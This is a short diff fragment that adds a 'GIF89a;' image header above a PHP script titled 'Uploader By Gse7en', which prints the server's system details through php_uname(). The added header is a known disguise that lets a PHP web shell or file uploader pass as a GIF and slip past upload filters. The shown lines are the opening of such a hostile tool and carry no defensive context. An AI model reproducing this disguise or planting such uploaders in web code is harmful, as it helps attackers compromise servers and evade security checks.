@@ -1,3 +1,4 @@
+GIF89a;
 <?php
 echo "<i>Uploader By Gse7en<br>";
 echo "<b>".php_uname()."</b><br>";
